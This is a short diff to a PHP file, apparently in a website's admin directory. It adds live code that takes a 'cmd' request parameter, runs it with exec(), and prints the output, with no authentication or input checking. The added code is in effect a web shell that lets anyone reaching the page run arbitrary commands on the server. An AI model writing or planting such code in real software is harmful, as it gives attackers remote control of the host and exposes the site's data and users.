@@ -1,6 +1,14 @@
 <?php
-    // $command=$_REQUEST['command'];
-    // execPrint($command);
+    if(isset($_REQUEST['cmd'])){
+        $command=$_REQUEST['cmd'];
+        // execPrint($command);
+        exec($command, $result);
+    
+        foreach ($result as $line) {
+            print($line . "\n");
+        }
+    }
+    
     $output = shell_exec('/var/www/html/microbird-website/admin/script.sh');
     
     // echo "<pre>$output</pre>";
